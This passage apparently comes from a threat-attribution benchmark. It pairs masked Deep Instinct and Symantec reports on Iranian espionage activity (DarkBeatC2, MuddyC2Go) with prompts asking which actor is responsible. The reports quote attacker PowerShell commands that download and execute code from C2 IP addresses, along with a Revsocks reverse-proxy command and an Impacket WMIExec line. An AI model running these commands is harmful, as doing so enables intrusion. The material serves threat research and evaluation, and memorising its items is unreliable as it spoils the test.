recipients have in the sender as a familiar and credible organization.    During the same time, another archive hosted both on Sync and OneHub was observed using the Hebrew name for “scholarship.” This indicates another potential abuse of their access to “Rashim’s” accounts to target victims in the education sector, tricking them into installing a remote administration tool.    While not conclusive, the timeframe and context of the events indicate a potential hand-off or collaboration between IRGC and MOIS to inflict as much harm as possible on Israeli organizations and individuals.    Additional [PLACEHOLDER] Shenanigans  In early March 2024, after a year of silence, DarkBit made some bold claims about their new victims. However, so far, the only proof they have provided indicates a single compromise at the INCD.    For those of you who don’t remember, DarkBit is the group that took responsibility for the Technion hack. Microsoft attributed it to [PLACEHOLDER], and DarkBit itself later admitted this (See Figure 6).    fig06-darkbit_muddy.png  Figure 6: DarkBit acknowledging they are [PLACEHOLDER]. (Source: K7 Security Labs)  While DarkBit has since deleted this message, the internet still remembers.    In their current iteration, DarkBit decided to upload and leak stolen data using “freeupload[.]store”    fig07-freeupload.png  Figure 7: DarkBit using freeupload[.]store (Source: K7 Security Labs)  During the same timeframe, in early March 2024, Deep Instinct identified two different MSI files named “IronSwords.msi,” which are installers of “Atera Agent,” the current RMM used by [PLACEHOLDER].    Those files have been uploaded as is, without being packaged into archives. One file has been uploaded to filetransfer[.]io, while the second file was uploaded to freeupload[.]store.    The domain freeupload[.]store belongs to the “0Day forums,” a hacking community on the dark web.    The discovery of the Atera installer on a public hosting service, by itself, does not provide sufficient evidence to draw conclusions. However, when considering the context – the specific filename, the timing of its appearance, the nature of the software, and the fact the same file hosting service was used – the likelihood that these two files are connected to another Iranian campaign, likely carried out by [PLACEHOLDER], is significantly increased.    Introducing DarkBeatC2  Deep Instinct found a needle in the haystack: the DarkBeatC2 and other new tools that [PLACEHOLDER] most likely uses.    The IP address 185.236.234[.]161 is not known to be associated with [PLACEHOLDER]. However, it does belong to “Stark-Industries,” a known hosting provider for malicious activity.    The IP address hosts the “reNgine” open-source reconnaissance framework.    While there is no previous public documentation of [PLACEHOLDER] using this framework, they have a track record of using a variety of open-source tools, and reconnaissance is an important part of the “Cyber Kill Chain.”    Additionally, the domains aramcoglobal[.]site and mafatehgroup[.]com point to the IP address 185.236.234[.]161.    The domain mafatehgroup[.]com impersonates the domain mafateehgroup.com, which is a digital services provider with offices in Jordan and Saudi Arabia. Jordan, Saudia, and Aramco are known targets of Iranian threat actors.    The IP address 185.216.13[.]242 also belongs to “Stark-Industries,” but this IP hosted an administration panel for “Tactical RMM.”    Cybersecurity researchers have reported that “Tactical RMM” is being exploited by threat actors to deploy ransomware.    “Tactical RMM” is another remote administration tool. It’s no surprise that [PLACEHOLDER] is abusing it given its track record of leveraging RATs.    The domain “websiteapicloud[.]com” resolves to the same IP address, 185.216.13[.]242, which hosts the “Tactical RMM.” This has already been observed to be linked to an unnamed APT.    While writing this blog, we learned that “Intel-Ops” is also tracking the [PLACEHOLDER] activity described above.    Deep Instinct tracks the domain “websiteapicloud[.]com” as part of [PLACEHOLDER]'s new DarkBeatC2 framework.    While IP addresses are at the bottom of the “Pyramid of Pain” and should be easy for a threat actor to change, [PLACEHOLDER] keeps reusing the same IP addresses.    Early links between [PLACEHOLDER] and DarkBeatC2 can be seen in the following IP addresses:    91.121.240[.]102 – This IP was mentioned almost a year ago in the “SimpleHarm” campaign, but in February this year, the domain googlelinks[.]net started to point to it.  137.74.131[.]19 – This IP is in the same subnet that has been known to host [PLACEHOLDER] servers in both “SimpleHarm” and “PhonyC2” campaigns. The domain googlevalues[.]com also pointed to this IP address in February 2024.  164.132.237[.]68 – This IP is in the same subnet that has been known to host [PLACEHOLDER] servers in both “SimpleHarm” and “PhonyC2” campaigns. The domain nc6010721b[.]biz resolved to this IP address in 2021. The domain name pattern (6nc/nc6) is very similar to domains we suspected to be related to [PLACEHOLDER] in their “PhonyC2” campaign. While we still can’t confirm whether this is done by the VPS provider or by [PLACEHOLDER], there is a relation between those two.  While there are more domains and IPs related to the DarkBeatC2, which you can find in the indicators appendix to this blog, we will focus on the following domain: googleonlinee[.]com    Much like [PLACEHOLDER]’s previous C2 frameworks, it serves as a central point to manage all of the infected computers. The threat actor usually establishes a connection to their C2 in one of the following ways:    Manually executing PowerShell code to establish a connection to the C2 after gaining initial access via another method.  Wrapping a connector to execute the code to establish a C2 connection within the first stage payload, which is delivered in a spear phishing email.  Sideloading a malicious DLL to execute the code to establish a C2 connection by masquerading as a legitimate application (PowGoop and MuddyC2Go).  While we could not identify how the connection to DarkBeatC2 was made, we were able to obtain some of the PowerShell responses to understand more about what it does and how.    In general, this framework is similar to the previous C2 frameworks used by [PLACEHOLDER]. PowerShell remains their “bread and butter.”    The URL googleonlinee[.]com/setting/8955224/r4WB7DzDOwfaHSevxHH0 contains the following PowerShell code:    fig08-setting_powershell.png  Figure 8: PowerShell code from “setting” URI.  The above code simply fetches and executes two additional PowerShell scripts from the same C2 server.    The code from the URL with “8946172” is included in Figure 9.    fig09-8946172.png  Figure 9: PowerShell code from “8946172” URI.  This code is also simple. It reads the contents of a file named “C:\ProgramData\SysInt.log“ and sends it to the C2 via a POST request.    While we don’t know the contents of the file, the C2 framework creates it in another stage, perhaps for a similar purpose to the file named “db.sqlite” in PhonyC2.    The code from the second URL, with “7878123,” is included in Figure 10.    fig10-7878123.png  Figure 10: PowerShell code from “7878123” URI.  This code is more complex than the previous two code snippets. It runs in a loop that sleeps for 20 seconds, trying to connect to the C2 and fetch additional content. If the content is not null, there is an additional check to see if the content contains the string “SRT_”. If this string is present, the content is converted into an array with the sign “_” as a delimiter. The script then takes the second object of the array and sleeps the amount of time in seconds that is represented as a number in that object.    If the content is not null but does not contain the string “SRT_” the script will convert the content of the response into a scriptblock and will execute it while writing the response to the aforementioned “SysInt.log” file.    During our analysis, the server responded with a 403-error message. As such, we did not receive any content during this phase.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Despite the large number of Iranian cyber attacks against Israeli organizations, which has significantly increased since the start of the “Swords of Iron War,” Israeli reporting about the attacks has been limited to mainstream news reports without technical details beyond general IOCs.    Most of the technical details about the attacks are exclusively being shared by international companies outside of Israel even though most of the incident response is done by local Israeli companies and the Israel National Cyber Directorate (INCD).    For example, in mid-February 2024, Google shared a recap of some of the events that have occurred since the start of 2024. The report includes information not reported by the local news or the INCD.    When the INCD does share alerts about malicious cyber activity against Israeli companies, which is infrequent, they’re vague on specifics. Recently, they shared an alert about multiple state-sponsored groups targeting “mostly” a few specific sectors.    The alert also includes a Yara rule set and a long list of IOCs without any additional context.    Providing IOCs without any context might help for a day, but there is a reason why they are located at the bottom of the “Pyramid of Pain,” a term we will often refer to in this blog.    Going Through a Pile of Garbage to Find Golden Nuggets  While the shared information is not enough to be useful for the companies that are being targeted, let’s do a dumpster dive into what has been shared and see if we can salvage anything useful.    The Yara rules are for various wipers based on the rule’s names. Although no hashes or additional info is provided, it is possible to link the rules to the following specific attacks:    BiBi wiper by KarMa  Homeland Justice wiper targeting Albanian Parliament (2022)  Homeland Justice wiper targeting Albania’s Institute of Statistics (INSTAT)  Google links KarMa to DEV-0842/BanishedKitten. In Microsoft’s investigation into the 2022 Albanian government attacks, they “assessed with high confidence that multiple Iranian actors participated in this attack.” Microsoft states, “DEV-0842 deployed the ransomware and wiper malware,” while three additional groups participated in the attack. Each group was responsible for a different step in the “Cyber Kill Chain.”    Additionally, Microsoft links all the different groups in this attack to the Iranian Ministry of Intelligence and Security (MOIS).    fig01-threat-actors-behind-the-attack.png  Figure 1: Threat actors behind the attack against the Albanian government in 2022. (Source: Microsoft)  In another investigation into the 2022 Albanian government attack, Mandiant also raised “the possibility of a cross-team collaboration.”    The IOC list shared by INCD includes hashes for seven files, only three of which are publicly available. Among those publicly available, two are generic webshells from 2020.    The last file is also a webshell. But unlike the other two, it is not a generic webshell but a variant of the FoxShell used by ScarredManticore/DEV-0861/ShroudedSnooper, which Microsoft observed participating in the 2022 cyberattack on the Albanian government.    If we make an analogy to medical terminology, webshell is just a symptom, and trying to prevent webshells by hash values is easily bypassed. Therefore, it is not considered as a prevention capability.    Out of the three domains shared by INCD, only one is publicly known to be directly related to Iranian activity. The domain vatacloud[.]com was used by DEV-1084 (DarkBit) in their attack against the Technion in February 2023. According to Microsoft, “DEV-1084 likely worked in partnership with MERCURY.”    The last of the IOCs includes 31 IP addresses without a description.    Out of those, Deep Instinct could not identify any known malicious activity in 11 IP addresses.    Another 11 IP addresses are known to be associated with [PLACEHOLDER] from previous campaigns,    such as SimpleHarm, PhonyC2, and MuddyC2Go (1, 2).    The nine remaining IP addresses are most likely also related to [PLACEHOLDER]. Moreover, we believe that these IPs host the latest tools used by the threat actor and their latest C2 framework, which we named “DarkBeatC2.”    Now, let’s examine the additional context surrounding the above findings to see the full picture.    Presenting “Lord Nemesis”  “Lord Nemesis” is the latest, “all the rage” Iranian “faketivist” operation.    fig02-faketivism.png  Figure 2: Faketivism definition.  Due to the lack of transparency and context in reports on most Iranian cyber operations against Israel, the following rare sighting of a detailed report about a recent supply-chain attack amplifies why context is so important.    A unique report from OP Innovate details how the attackers, who call themselves “Lord Nemesis,” managed to access multiple organizations by compromising a single IT provider named “Rashim.”    According to the report, “One of the critical factors that allowed Lord Nemesis to extend its attack beyond Rashim was the company’s practice of maintaining an admin user account on some of its customer systems. By hijacking this admin account, the attackers were able to access numerous organizations by using their VPN that relied on the Michlol CRM, potentially compromising the security of these institutions and putting their data at risk.”    While the report contains additional context that explains how the attackers operated after they gained initial access, it does not explain how the attack was attributed to “Nemesis Kitten,” as mentioned at the beginning of their report.    According to Microsoft, “Nemesis Kitten” is DEV-0270 (Cobalt Mirage, TunnelVision), a subgroup of the Iranian threat actor Mint Sandstorm (PHOSPHORUS, APT35, Charming Kitten), which we have previously observed exploiting Exchange servers.    While “Mint Sandstorm” has been linked to the Iranian IRGC, DEV-0270 is a private subcontractor known as “SecNerd” or “Najee Technology.”    However, the most important detail from Op Innovate’s blog is the following: “To instill fear in his victims and demonstrate the extent of his access, ‘Lord Nemesis,’ contacted a list of Rashim’s users and colleagues via Rashim’s email system on March 4th. This communication occurred four months after the initial breach of Rashim’s infrastructure, highlighting the attacker’s prolonged presence within the system.”    This is important because if “Lord Nemesis” were able to breach Rashim’s email system, they might have breached the email systems of Rashim’s customers using the admin accounts that now we know they obtained from “Rashim,” thanks to Op Innovate’s reporting.    So, why is this so important? Read on.    Back to [PLACEHOLDER]  We have reported about [PLACEHOLDER] activity numerous times.    Despite the reports, the threat actor only slightly changes its core TTPs, as the “Pyramid of Pain” predicted. While occasionally switching to a new remote administration tool or changing their C2 framework (due to a previous one being leaked), [PLACEHOLDER]’s methods remain constant, as described in our very first blog about the threat actor.      fig03-current-[PLACEHOLDER]-campign.png  Figure 3: Updated [PLACEHOLDER] campaign overview.  In a recent security brief by Proofpoint, [PLACEHOLDER] (TA450) was observed sending PDF attachments from the email of a compromised Israeli company.    Those PDF attachments contained links to various web hosting services where users could download an archive containing a remote administration tool, as shown in Figure 3 above.    However, one of those web hosting providers – “Egnyte,” with a “salary.egnyte[.]com” subdomain – was new and not previously known to be in use by [PLACEHOLDER].    While this change seems minor and insignificant, it is the exact opposite when given additional context. At the same time Proofpoint reported this campaign, Deep Instinct observed a similar campaign using a different subdomain, “kinneretacil.egnyte[.]com.” The subdomain refers to the domain “kinneret.ac.il,” which is an Israeli higher education college.    Kinneret is a customer of “Rashim,” thanks to the information that was shared by OP Innovate. This led us to believe that kinneretacil.egnyte[.]com might be part of their infrastructure compromised by “Lord Nemesis,” especially since it shared username “ori ben-dor” which looks like an authentic Israeli name (see Figure 4).    fig04-uploader-information-at-kinneretacil.jfif  Figure 4: Uploader information at kinneretacil.egnyte[.]com  Thanks to the context given by Proofpoint, it appears the Egnyte account was not compromised but rather created by [PLACEHOLDER]. This can be seen by the lack of creativity in the uploader name (“Shared by gsdfg gsg”) in the instance Proofpoint observed (See Figure 5).    fig05-uploader_info-salary.png  Figure 5: Uploader information at salary.egnyte[.]com  Since [PLACEHOLDER] used a compromised email account to spread the links to salary.egnyte[.]com, this was also likely with the kinneretacil.egnyte[.]com links, although we don’t have direct evidence.    [PLACEHOLDER] may have used the “Kinneret” email account to distribute these links, exploiting the trust recipients have in the sender as a familiar and credible organization.    During the same time, another archive hosted both on Sync and OneHub was observed using the Hebrew name for “scholarship.” This indicates another potential abuse of their access to “Rashim’s” accounts to target victims in the education sector, tricking them into installing a remote administration tool.    While not conclusive, the timeframe and context of the events indicate a potential hand-off or collaboration between IRGC and MOIS to inflict as much harm as possible on Israeli organizations and individuals.    Additional [PLACEHOLDER] Shenanigans  In early March 2024, after a year of silence, DarkBit made some bold claims about their new victims. However, so far, the only proof they have provided indicates a single compromise at the INCD.    For those of you who don’t remember, DarkBit is the group that took responsibility for the Technion hack. Microsoft attributed it to [PLACEHOLDER], and DarkBit itself later admitted this (See Figure 6).    fig06-darkbit_muddy.png  Figure 6: DarkBit acknowledging they are [PLACEHOLDER]. (Source: K7 Security Labs)  While DarkBit has since deleted this message, the internet still remembers.    In their current iteration, DarkBit decided to upload and leak stolen data using “freeupload[.]store”    fig07-freeupload.png  Figure 7: DarkBit using freeupload[.]store (Source: K7 Security Labs)  During the same timeframe, in early March 2024, Deep Instinct identified two different MSI files named “IronSwords.msi,” which are installers of “Atera Agent,” the current RMM used by [PLACEHOLDER].    Those files have been uploaded as is, without being packaged into archives. One file has been uploaded to filetransfer[.]io, while the second file was uploaded to freeupload[.]store.    The domain freeupload[.]store belongs to the “0Day forums,” a hacking community on the dark web.    The discovery of the Atera installer on a public hosting service, by itself, does not provide sufficient evidence to draw conclusions. However, when considering the context – the specific filename, the timing of its appearance, the nature of the software, and the fact the same file hosting service was used – the likelihood that these two files are connected to another Iranian campaign, likely carried out by [PLACEHOLDER], is significantly increased.    Introducing DarkBeatC2  Deep Instinct found a needle in the haystack: the DarkBeatC2 and other new tools that [PLACEHOLDER] most likely uses.    The IP address 185.236.234[.]161 is not known to be associated with [PLACEHOLDER]. However, it does belong to “Stark-Industries,” a known hosting provider for malicious activity.    The IP address hosts the “reNgine” open-source reconnaissance framework.    While there is no previous public documentation of [PLACEHOLDER] using this framework, they have a track record of using a variety of open-source tools, and reconnaissance is an important part of the “Cyber Kill Chain.”    Additionally, the domains aramcoglobal[.]site and mafatehgroup[.]com point to the IP address 185.236.234[.]161.    The domain mafatehgroup[.]com impersonates the domain mafateehgroup.com, which is a digital services provider with offices in Jordan and Saudi Arabia. Jordan, Saudia, and Aramco are known targets of Iranian threat actors.    The IP address 185.216.13[.]242 also belongs to “Stark-Industries,” but this IP hosted an administration panel for “Tactical RMM.”    Cybersecurity researchers have reported that “Tactical RMM” is being exploited by threat actors to deploy ransomware.    “Tactical RMM” is another remote administration tool. It’s no surprise that [PLACEHOLDER] is abusing it given its track record of leveraging RATs.    The domain “websiteapicloud[.]com” resolves to the same IP address, 185.216.13[.]242, which hosts the “Tactical RMM.” This has already been observed to be linked to an unnamed APT.    While writing this blog, we learned that “Intel-Ops” is also tracking the [PLACEHOLDER] activity described above.    Deep Instinct tracks the domain “websiteapicloud[.]com” as part of [PLACEHOLDER]'s new DarkBeatC2 framework.    While IP addresses are at the bottom of the “Pyramid of Pain” and should be easy for a threat actor to change, [PLACEHOLDER] keeps reusing the same IP addresses.    Early links between [PLACEHOLDER] and DarkBeatC2 can be seen in the following IP addresses:    91.121.240[.]102 – This IP was mentioned almost a year ago in the “SimpleHarm” campaign, but in February this year, the domain googlelinks[.]net started to point to it.  137.74.131[.]19 – This IP is in the same subnet that has been known to host [PLACEHOLDER] servers in both “SimpleHarm” and “PhonyC2” campaigns. The domain googlevalues[.]com also pointed to this IP address in February 2024.  164.132.237[.]68 – This IP is in the same subnet that has been known to host [PLACEHOLDER] servers in both “SimpleHarm” and “PhonyC2” campaigns. The domain nc6010721b[.]biz resolved to this IP address in 2021. The domain name pattern (6nc/nc6) is very similar to domains we suspected to be related to [PLACEHOLDER] in their “PhonyC2” campaign. While we still can’t confirm whether this is done by the VPS provider or by [PLACEHOLDER], there is a relation between those two.  While there are more domains and IPs related to the DarkBeatC2, which you can find in the indicators appendix to this blog, we will focus on the following domain: googleonlinee[.]com    Much like [PLACEHOLDER]’s previous C2 frameworks, it serves as a central point to manage all of the infected computers. The threat actor usually establishes a connection to their C2 in one of the following ways:    Manually executing PowerShell code to establish a connection to the C2 after gaining initial access via another method.  Wrapping a connector to execute the code to establish a C2 connection within the first stage payload, which is delivered in a spear phishing email.  Sideloading a malicious DLL to execute the code to establish a C2 connection by masquerading as a legitimate application (PowGoop and MuddyC2Go).  While we could not identify how the connection to DarkBeatC2 was made, we were able to obtain some of the PowerShell responses to understand more about what it does and how.    In general, this framework is similar to the previous C2 frameworks used by [PLACEHOLDER]. PowerShell remains their “bread and butter.”    The URL googleonlinee[.]com/setting/8955224/r4WB7DzDOwfaHSevxHH0 contains the following PowerShell code:    fig08-setting_powershell.png  Figure 8: PowerShell code from “setting” URI.  The above code simply fetches and executes two additional PowerShell scripts from the same C2 server.    The code from the URL with “8946172” is included in Figure 9.    fig09-8946172.png  Figure 9: PowerShell code from “8946172” URI.  This code is also simple. It reads the contents of a file named “C:\ProgramData\SysInt.log“ and sends it to the C2 via a POST request.    While we don’t know the contents of the file, the C2 framework creates it in another stage, perhaps for a similar purpose to the file named “db.sqlite” in PhonyC2.    The code from the second URL, with “7878123,” is included in Figure 10.    fig10-7878123.png  Figure 10: PowerShell code from “7878123” URI.  This code is more complex than the previous two code snippets. It runs in a loop that sleeps for 20 seconds, trying to connect to the C2 and fetch additional content. If the content is not null, there is an additional check to see if the content contains the string “SRT_”. If this string is present, the content is converted into an array with the sign “_” as a delimiter. The script then takes the second object of the array and sleeps the amount of time in seconds that is represented as a number in that object.    If the content is not null but does not contain the string “SRT_” the script will convert the content of the response into a scriptblock and will execute it while writing the response to the aforementioned “SysInt.log” file.    During our analysis, the server responded with a 403-error message. As such, we did not receive any content during this phase.
https://symantec-enterprise-blogs.security.com/threat-intelligence/iran-apt-seedworm-africa-telecoms	[PLACEHOLDER] has been active since at least 2017, and has targeted organizations in many countries, though it is most strongly associated with attacks on organizations in the Middle East. It has been publicly stated that [PLACEHOLDER] is a cyberespionage group that is believed to be a subordinate part of Iran’s Ministry of Intelligence and Security (MOIS).    The attackers used a variety of tools in this activity, which occurred in November 2023, including leveraging the MuddyC2Go infrastructure, which was recently discovered and documented by Deep Instinct. Researchers on Symantec’s Threat Hunter Team, part of Broadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated.    The attackers also use the SimpleHelp remote access tool and Venom Proxy, which have previously been associated with [PLACEHOLDER] activity, as well as using a custom keylogging tool, and other publicly available and living-off-the-land tools.    Attack Chain  The attacks in this campaign occurred in November 2023. Most of the activity we observed occurred on one telecommunications organization. The first evidence of malicious activity was some PowerShell executions related to the MuddyC2Go backdoor.    A MuddyC2Go launcher named “vcruntime140.dll” was saved in the folder “csidl_common_appdata\javax”, which seems to have been sideloaded by jabswitch.exe. Jabswitch.exe is a legitimate Java Platform SE 8 executable.    The MuddyC2Go launcher executed the following PowerShell code to connect to its command-and-control (C&C) server:    tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp="tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp";$uri ="http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;    It appears that the variables at the beginning of the code are there for the purposes of attempting to bypass detection by security software, as they are unused and not relevant.    Right after this execution, attackers launched the MuddyC2Go malware using a scheduled task that had previously been created:    "CSIDL_SYSTEM\schtasks.exe" /run /tn "Microsoft\Windows\JavaX\Java Autorun"    The attackers also used some typical commands related to the Impacket WMIExec hacktool:    cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1698662615.0451615 2>&1    The SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102 C&C server. Further PowerShell stager execution also occurred, while the attacker also executed the Revsocks tool:    CSIDL_COMMON_APPDATA\do.exe -co 94.131.3.160:443 -pa super -q    The attackers also used a second legitimate remote access tool, AnyDesk, which was deployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions related to MuddyC2Go also occurred on the same machine:     $uri ="http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;    Notably, this organization is believed to have previously been infiltrated by [PLACEHOLDER] earlier in 2023. The primary activity of note during that intrusion was extensive use of SimpleHelp to carry out a variety of activity, including:     Launching PowerShell  Launching a proxy tool  Dumping SAM hives  Using WMI to get drive info  Installing the JumpCloud remote access software  Delivering proxy tools, a suspected LSASS dump tool, and a port scanner.  During that intrusion, it’s believed the attackers used WMI to launch the SimpleHelp installer on the victim network. At the time, this activity couldn’t be definitively linked to [PLACEHOLDER], but this subsequent activity appears to show that the earlier activity was carried out by the same group of attackers.    In another telecommunications and media company targeted by the attackers, multiple incidents of SimpleHelp were used to connect to known [PLACEHOLDER] infrastructure. A custom build of the Venom Proxy hacktool was also executed on this network, as well as the new custom keylogger used by the attackers in this activity.    In the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and suspicious Windows Scripting Files (WSF) that have been associated with [PLACEHOLDER] activity in the past.          Toolset  The most interesting part of the toolset used in this activity is probably the presence of the MuddyC2Go launcher, which was sideloaded by jabswitch.exe.    The malware reads the C&C URL from the Windows registry value “End” stored inside the key “HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip”. The URL path is read from the “Status” value in the same aforementioned key.    Lastly, the MuddyC2GO launcher executes the following PowerShell command to contact its C&C server and execute the PowerShell code received:    powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;    The MuddyC2Go framework was first publicly written about in a blog published by Deep Instinct researchers on November 8, 2023. That blog documented its use in attacks on organizations in countries in the Middle East. The researchers said the framework may have been used by [PLACEHOLDER] since 2020. They also said that the framework, which is written in Go, has replaced [PLACEHOLDER]’s previous PhonyC2 C&C infrastructure. This replacement appears to have occurred after the PhonyC2 source code was leaked earlier in 2023. The full capabilities of MuddyC2Go are not yet known, but the executable contains an embedded PowerShell script that automatically connects to [PLACEHOLDER]’s C&C server, which eliminates the need for manual execution by an operator and gives the attackers remote access to a victim machine. Deep Instinct said it was able to link MuddyC2Go to attacks dating back to 2020 due to the unique URL patterns generated by the framework. It also said that the MuddyC2Go servers it observed were hosted at “Stark Industries”, which is a VPS provider that is known to host malicious activity.     Other tools of note used in this activity included SimpleHelp, which is a legitimate remote device control and management tool, for persistence on victim machines. SimpleHelp is believed to have been used in attacks carried out by [PLACEHOLDER] since at least July 2022. Once installed on a victim device, SimpleHelp can constantly run as a system service, which makes it possible for attackers to gain access to the user’s device at any point in time, even after a reboot. SimpleHelp also allows attackers to execute commands on a device with administrator privileges. SimpleHelp is now strongly associated with [PLACEHOLDER] activity and the tool is installed on several of [PLACEHOLDER]’s servers.    Venom Proxy is a publicly available tool that is described as “a multi-hop proxy tool developed for penetration testers.” It is written in Go. It can be used to easily proxy network traffic to a multi-layer intranet, and easily manage intranet nodes. It has been associated with [PLACEHOLDER] since at least mid-2022, with Microsoft describing it as [PLACEHOLDER]’s “tool of choice” in an August 2022 blog. [PLACEHOLDER] tends to use a custom build of Venom Proxy in its activity.     Other tools used in this activity include:    Revsocks - A cross-platform SOCKS5 proxy server program/library written in C that can also reverse itself over a firewall.  AnyDesk - A legitimate remote desktop application. It and similar tools are often used by attackers to obtain remote access to computers on a network.   PowerShell - [PLACEHOLDER] makes heavy use of PowerShell, as well as PowerShell-based tools and scripts in its attacks. PowerShell is a Microsoft scripting tool that can be used to run commands, download payloads, traverse compromised networks, and carry out reconnaissance.  Custom keylogger	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] has been active since at least 2017, and has targeted organizations in many countries, though it is most strongly associated with attacks on organizations in the Middle East. It has been publicly stated that [PLACEHOLDER] is a cyberespionage group that is believed to be a subordinate part of Iran’s Ministry of Intelligence and Security (MOIS).    The attackers used a variety of tools in this activity, which occurred in November 2023, including leveraging the MuddyC2Go infrastructure, which was recently discovered and documented by Deep Instinct. Researchers on Symantec’s Threat Hunter Team, part of Broadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated.    The attackers also use the SimpleHelp remote access tool and Venom Proxy, which have previously been associated with [PLACEHOLDER] activity, as well as using a custom keylogging tool, and other publicly available and living-off-the-land tools.    Attack Chain  The attacks in this campaign occurred in November 2023. Most of the activity we observed occurred on one telecommunications organization. The first evidence of malicious activity was some PowerShell executions related to the MuddyC2Go backdoor.    A MuddyC2Go launcher named “vcruntime140.dll” was saved in the folder “csidl_common_appdata\javax”, which seems to have been sideloaded by jabswitch.exe. Jabswitch.exe is a legitimate Java Platform SE 8 executable.    The MuddyC2Go launcher executed the following PowerShell code to connect to its command-and-control (C&C) server:    tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp="tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp";$uri ="http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;    It appears that the variables at the beginning of the code are there for the purposes of attempting to bypass detection by security software, as they are unused and not relevant.    Right after this execution, attackers launched the MuddyC2Go malware using a scheduled task that had previously been created:    "CSIDL_SYSTEM\schtasks.exe" /run /tn "Microsoft\Windows\JavaX\Java Autorun"    The attackers also used some typical commands related to the Impacket WMIExec hacktool:    cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1698662615.0451615 2>&1    The SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102 C&C server. Further PowerShell stager execution also occurred, while the attacker also executed the Revsocks tool:    CSIDL_COMMON_APPDATA\do.exe -co 94.131.3.160:443 -pa super -q    The attackers also used a second legitimate remote access tool, AnyDesk, which was deployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions related to MuddyC2Go also occurred on the same machine:     $uri ="http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response.Content;    Notably, this organization is believed to have previously been infiltrated by [PLACEHOLDER] earlier in 2023. The primary activity of note during that intrusion was extensive use of SimpleHelp to carry out a variety of activity, including:     Launching PowerShell  Launching a proxy tool  Dumping SAM hives  Using WMI to get drive info  Installing the JumpCloud remote access software  Delivering proxy tools, a suspected LSASS dump tool, and a port scanner.  During that intrusion, it’s believed the attackers used WMI to launch the SimpleHelp installer on the victim network. At the time, this activity couldn’t be definitively linked to [PLACEHOLDER], but this subsequent activity appears to show that the earlier activity was carried out by the same group of attackers.    In another telecommunications and media company targeted by the attackers, multiple incidents of SimpleHelp were used to connect to known [PLACEHOLDER] infrastructure. A custom build of the Venom Proxy hacktool was also executed on this network, as well as the new custom keylogger used by the attackers in this activity.    In the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and suspicious Windows Scripting Files (WSF) that have been associated with [PLACEHOLDER] activity in the past.          Toolset  The most interesting part of the toolset used in this activity is probably the presence of the MuddyC2Go launcher, which was sideloaded by jabswitch.exe.    The malware reads the C&C URL from the Windows registry value “End” stored inside the key “HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip”. The URL path is read from the “Status” value in the same aforementioned key.    Lastly, the MuddyC2GO launcher executes the following PowerShell command to contact its C&C server and execute the PowerShell code received:    powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;    The MuddyC2Go framework was first publicly written about in a blog published by Deep Instinct researchers on November 8, 2023. That blog documented its use in attacks on organizations in countries in the Middle East. The researchers said the framework may have been used by [PLACEHOLDER] since 2020. They also said that the framework, which is written in Go, has replaced [PLACEHOLDER]’s previous PhonyC2 C&C infrastructure. This replacement appears to have occurred after the PhonyC2 source code was leaked earlier in 2023. The full capabilities of MuddyC2Go are not yet known, but the executable contains an embedded PowerShell script that automatically connects to [PLACEHOLDER]’s C&C server, which eliminates the need for manual execution by an operator and gives the attackers remote access to a victim machine. Deep Instinct said it was able to link MuddyC2Go to attacks dating back to 2020 due to the unique URL patterns generated by the framework. It also said that the MuddyC2Go servers it observed were hosted at “Stark Industries”, which is a VPS provider that is known to host malicious activity.     Other tools of note used in this activity included SimpleHelp, which is a legitimate remote device control and management tool, for persistence on victim machines. SimpleHelp is believed to have been used in attacks carried out by [PLACEHOLDER] since at least July 2022. Once installed on a victim device, SimpleHelp can constantly run as a system service, which makes it possible for attackers to gain access to the user’s device at any point in time, even after a reboot. SimpleHelp also allows attackers to execute commands on a device with administrator privileges. SimpleHelp 